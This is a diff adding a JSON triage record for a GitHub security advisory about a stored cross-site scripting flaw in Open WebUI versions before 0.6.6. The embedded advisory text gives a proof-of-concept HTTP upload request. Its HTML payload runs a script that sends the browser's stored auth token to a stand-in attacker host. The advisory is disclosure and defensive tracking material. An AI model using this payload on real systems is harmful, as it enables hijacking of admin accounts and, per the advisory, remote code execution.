@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/47993064?v=4\", \"events_url\": \"https://api.github.com/users/choket/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/choket/followers\", \"following_url\": \"https://api.github.com/users/choket/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/choket/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/choket\", \"id\": 47993064, \"login\": \"choket\", \"node_id\": \"MDQ6VXNlcjQ3OTkzMDY0\", \"organizations_url\": \"https://api.github.com/users/choket/orgs\", \"received_events_url\": \"https://api.github.com/users/choket/received_events\", \"repos_url\": \"https://api.github.com/users/choket/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/choket/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/choket/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/choket\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2025-46571\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 6.4, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}, {\"cwe_id\": \"CWE-87\", \"name\": \"Improper Neutralization of Alternate XSS Syntax\"}], \"description\": \"### Summary\\nLow privileged users can upload HTML files which contain JavaScript code via the `/api/v1/files/` backend endpoint. This endpoint returns a file id, which can be used to open the file in the browser and trigger the JavaScript code in the user's browser. Under the default settings, files uploaded by low-privileged users can only be viewed by admins or themselves, limiting the impact of this vulnerability.\\n\\n### Details\\n\\nThe following HTTP request can be sent to the backend server to upload a file with the contents:\\n`<script>fetch(\\\"https://attacker.com/?token=\\\" + localStorage.getItem(\\\"token\\\"))</script>`\\n\\n```http\\nPOST /api/v1/files/ HTTP/1.1\\nHost: localhost:8080\\nContent-Length: 286\\nauthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijg2NjA1NTZhLTc0OWQtNDdmNS1iMjgwLWRiYzkyYzc2ZjM1NiJ9.4cImklYQUVi3dlXmRtQwdZKEleu0cq4tXompMod8X2U\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryr0PnRBBHKXD9UEdm\\n\\n------WebKitFormBoundaryr0PnRBBHKXD9UEdm\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"test.html\\\"\\nContent-Type: text/html\\n\\n<h1>padding</h1>\\n<script>fetch(\\\"https://attacker.com/?token=\\\" + localStorage.getItem(\\\"token\\\"))</script>\\n------WebKitFormBoundaryr0PnRBBHKXD9UEdm--\\n```\\n\\nNote the `filename=\\\"test.html\\\"` , `Content-Type: text/html`, and `<h1>padding</h`> in the request's body. These are important because some form of sanitization or filtering was observed which caused errors when uploading an html file that only conained a `<script>` tag. \\n\\nThe backend server responds to the above request with JSON data that contains an `id` parameter. \\n\\n![image](https://github.com/user-attachments/assets/ac15e108-d385-4e58-b29a-eb79aafbffda)\\n\\nThis ID can be used to view the uploaded file in the browser at `<Backend_URL>/api/v1/files/<file_id>/content/html`\\n\\nBecause of the authorization checks done on lines https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/files.py#L434-L438, this file can only be viewed by admins and the user that uploaded it, but not by other low-privileged users, thus limiting the imact of this stored XSS vulnerability.\\n\\n### PoC\\n\\nFirst, upload an html containing JavaScript code to the backend server using the following HTTP request:\\n```http\\nPOST /api/v1/files/ HTTP/1.1\\nHost: localhost:8080\\nContent-Length: 286\\nauthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijg2NjA1NTZhLTc0OWQtNDdmNS1iMjgwLWRiYzkyYzc2ZjM1NiJ9.4cImklYQUVi3dlXmRtQwdZKEleu0cq4tXompMod8X2U\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryr0PnRBBHKXD9UEdm\\n\\n------WebKitFormBoundaryr0PnRBBHKXD9UEdm\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"test.html\\\"\\nContent-Type: text/html\\n\\n<h1>padding</h1>\\n<script>fetch(\\\"https://attacker.com/?token=\\\" + localStorage.getItem(\\\"token\\\"))</script>\\n------WebKitFormBoundaryr0PnRBBHKXD9UEdm--\\n```\\n\\nThen copy the `id` from the response and use it to view the file in the browser at `<Backend_URL>/api/v1/files/<file_id>/content/html`\\n\\n\\n### Impact\\n\\nLow privileged users can upload HTML files containing malicious JavaScript code. A link to such a file can be sent to an admin, and if clicked, will give the low-privileged user complete control over the admin's account, ultimately enabling RCE via functions, as described in https://github.com/open-webui/open-webui/security/advisories/GHSA-9f4f-jv96-8766\", \"epss\": {\"percentage\": 0.003, \"percentile\": 0.21732}, \"ghsa_id\": \"GHSA-8gh5-qqh8-hq3x\", \"github_reviewed_at\": \"2026-07-07T16:50:43Z\", \"html_url\": \"https://github.com/advisories/GHSA-8gh5-qqh8-hq3x\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8gh5-qqh8-hq3x\"}, {\"type\": \"CVE\", \"value\": \"CVE-2025-46571\"}], \"nvd_published_at\": \"2025-05-05T19:15:57Z\", \"published_at\": \"2026-07-07T16:50:43Z\", \"references\": [\"https://github.com/open-webui/open-webui/security/advisories/GHSA-8gh5-qqh8-hq3x\", \"https://nvd.nist.gov/vuln/detail/CVE-2025-46571\", \"https://github.com/open-webui/open-webui/commit/ef2aeb7c0eb976bac759e59ac359c94a5b8dc7e0\", \"https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/files.py#L434-L438\", \"https://github.com/open-webui/open-webui/releases/tag/v0.6.6\", \"https://github.com/advisories/GHSA-8gh5-qqh8-hq3x\"], \"repository_advisory_url\": \"https://api.github.com/repos/open-webui/open-webui/security-advisories/GHSA-8gh5-qqh8-hq3x\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/open-webui/open-webui\", \"summary\": \"Open WebUI  allows limited stored XSS vila uploaded html file\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-07T16:50:43Z\", \"url\": \"https://api.github.com/advisories/GHSA-8gh5-qqh8-hq3x\", \"vulnerabilities\": [{\"first_patched_version\": \"0.6.6\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"open-webui\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.6.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8gh5-qqh8-hq3x",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "open-webui: < 0.6.6"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2025-46571"
+    ],
+    "cvss_score": 6.4,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "open-webui"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.765398Z",
+  "provenance": {
+    "content_sha256": "9ddb45df5325f801983ab33137ec80b1523a2c7c597002ef698866d28d02a86e",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-07T16:50:43Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8gh5-qqh8-hq3x",
+  "status": "active",
+  "title": "Open WebUI  allows limited stored XSS vila uploaded html file",
+  "updated_at": "2026-07-07T16:50:43Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8gh5-qqh8-hq3x"
+}
